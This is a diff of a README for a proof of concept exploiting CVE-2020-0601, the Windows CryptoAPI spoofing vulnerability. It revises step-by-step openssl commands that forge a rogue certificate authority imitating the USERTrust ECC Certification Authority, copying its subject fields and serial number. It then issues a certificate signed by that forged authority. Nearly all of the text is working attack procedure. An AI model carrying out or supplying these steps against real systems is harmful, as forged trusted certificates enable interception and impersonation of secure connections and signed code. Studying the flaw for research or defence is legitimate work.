@@ -4,26 +4,24 @@ CVE-2020-0601: Windows CryptoAPI Spoofing Vulnerability exploitation
 
 # CA certificate
 
-We used the [CloudFlare Inc ECC CA-2](https://ssl-tools.net/subjects/2b0413693df1d33d7e89cba055cf204f9c158c9d)
+We used the [USERTrust ECC Certification Authority](http://www.tbs-x509.com/USERTrustECCCertificationAuthority.crt)
 
-An example of usage of this certificate is :
-```bash
-openssl s_client -connect tonerrefillkits.com:443 -showcerts
-```
+Key template:
+openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit
 
 To generate a private key which match the public key certificate we used the script **gen-key.py**. Then to generate the rogue CA:
 
 ```bash
-$ openssl req -key p256-key-rogue.pem -new -out ca-rogue.pem -x509
+$ openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x5c8b99c55a94c5d27156decd8980cc26
 ```
 
-Using these parameters: "C = US, ST = CA, L = San Francisco, O = "CloudFlare, Inc.", CN = CloudFlare Inc ECC CA-2"
+With "C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust ECC Certification Authority" parameters
 
 The we generate the following private key and certificate:
 ```bash
 openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem
 
-openssl req -key prime256v1-privkey.pem -new -out prime256v1.csr
+openssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr
 
-openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p256-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -sha256
+openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf 
 ```
